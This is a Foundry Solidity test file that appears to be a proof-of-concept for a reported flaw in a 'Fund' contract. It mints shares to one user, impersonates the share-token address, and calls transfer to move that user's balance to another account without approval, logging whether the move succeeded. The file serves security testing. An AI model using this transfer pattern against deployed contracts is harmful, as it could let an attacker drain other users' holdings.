// SPDX-License-Identifier: MIT
pragma solidity 0.6.10;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Fund.sol";

contract MockTokenUnderlying {
    constructor() public {}
}

contract MockTwapOracle {
    function getTwap(uint256) external pure returns (uint256) {
        return 1e18;
    }
}

contract MockAprOracle {
    function capture() external pure returns (uint256) {
        return 0;
    }
}

contract MockBallot {
    // Empty for testing
}

contract Empty {
    // Used as share token address placeholder
}

contract UnauthorizedTransferTest is Test {
    Fund public fund;
    address public owner = address(this);
    address public tokenUnderlying;
    address public tokenMAddress;
    address public tokenAAddress;
    address public tokenBAddress;
    
    address public userA = address(0xA);
    address public userB = address(0xB);
    uint256 constant TRANCHE_M = 0;
    uint256 constant AMOUNT = 1000e18;

    function setUp() public {
        // Set timestamp to 2 days (172800 sec) to prevent underflow
        vm.warp(172800);
        
        // Setup required tokens
        tokenUnderlying = address(new MockTokenUnderlying());
        
        // Deploy oracle dependencies
        MockTwapOracle twapOracle = new MockTwapOracle();
        MockAprOracle aprOracle = new MockAprOracle();
        MockBallot ballot = new MockBallot();
        
        // Deploy Fund
        fund = new Fund(
            tokenUnderlying,
            18, // underlyingDecimals_
            0,  // dailyProtocolFeeRate_
            0,  // upperRebalanceThreshold_
            0,  // lowerRebalanceThreshold_
            address(twapOracle),
            address(aprOracle),
            address(ballot),
            address(0) // feeCollector_
        );
        
        // Create empty contracts to represent share tokens
        tokenMAddress = address(new Empty());
        tokenAAddress = address(new Empty());
        tokenBAddress = address(new Empty());
        
        // Initialize Fund
        fund.initialize(
            tokenMAddress,
            tokenAAddress,
            tokenBAddress,
            address(this) // primaryMarket (this test contract)
        );
    }

    function test_UnauthorizedTransfer() public {
        // Mint tokens to userA
        fund.mint(TRANCHE_M, userA, AMOUNT);
        
        console.log("--- BEFORE-Trigger Transfer ---");
        // Query initial balances
        uint initialBalA = fund.shareBalanceOf(TRANCHE_M, userA);
        uint initialBalB = fund.shareBalanceOf(TRANCHE_M, userB);
        console.log("UserA Initial Balance:", initialBalA);
        console.log("UserB Initial Balance:", initialBalB);
        assertEq(initialBalA, AMOUNT, "Initial balance of userA incorrect");
        assertEq(initialBalB, 0, "Initial balance of userB should be zero");
        
        console.log("--- Trigger Unauthorized Transfer ---");
        // Simulate share token calling transfer without approval
        vm.prank(tokenMAddress);
        fund.transfer(TRANCHE_M, userA, userB, AMOUNT);
        
        console.log("--- AFTER-Trigger Transfer ---");
        // Query final balances
        uint finalBalA = fund.shareBalanceOf(TRANCHE_M, userA);
        uint finalBalB = fund.shareBalanceOf(TRANCHE_M, userB);
        console.log("UserA Final Balance:", finalBalA);
        console.log("UserB Final Balance:", finalBalB);
        
        // Differential verification
        console.log("--- Vulnerability Verification ---");
        console.log("UserA Balance Delta:", (initialBalA - finalBalA));
        console.log("UserB Balance Delta:", (finalBalB - initialBalB));
        
        if (initialBalA - finalBalA == AMOUNT && finalBalB - initialBalB == AMOUNT) {
            console.log("Vulnerability Exists: Unauthorized transfer succeeded");
        } else {
            console.log("Vulnerability not Exist: Transfer restrictions enforced");
        }
    }
}